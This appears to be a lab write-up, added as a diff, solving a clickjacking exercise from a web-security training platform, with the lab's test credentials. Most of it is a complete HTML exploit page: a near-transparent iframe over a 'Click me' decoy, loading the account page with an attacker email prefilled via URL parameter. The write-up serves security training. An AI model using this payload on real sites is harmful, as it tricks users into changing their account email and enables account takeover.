@@ -1,0 +1,42 @@
+Lab #2 - Clickjacking with form input data prefilled from a URL parameter
+
+Goal - The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
+
+Credentials - wiener:peter
+
+Analysis:
+- this websites allow user to prefill form using parameter in URL
+=> we can use this to prefill form with our emails and fool user into updating their email address by clicking on a "Click me" decoy.
+
+Solution:
+- craft an HTML file and upload to exploit server:
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            #target_website {
+                position: relative;
+                width: 700px;
+                height: 500px;
+                opacity: 0.01;
+                z-index: 2;
+
+            }
+
+            #decoy_website {
+                position: absolute;
+                top:480px;
+                left:60px;
+                z-index: 1;
+            }
+
+        </style>
+    </head>
+
+    <body>
+        <div id="decoy_website">
+            Click me
+        </div>
+        <iframe id="target_website" src="https://0a6e0075039e09f982d00b4c002000fc.web-security-academy.net/my-account?email=evil2@evil-email.com"></iframe>
+    </body>
+</html>
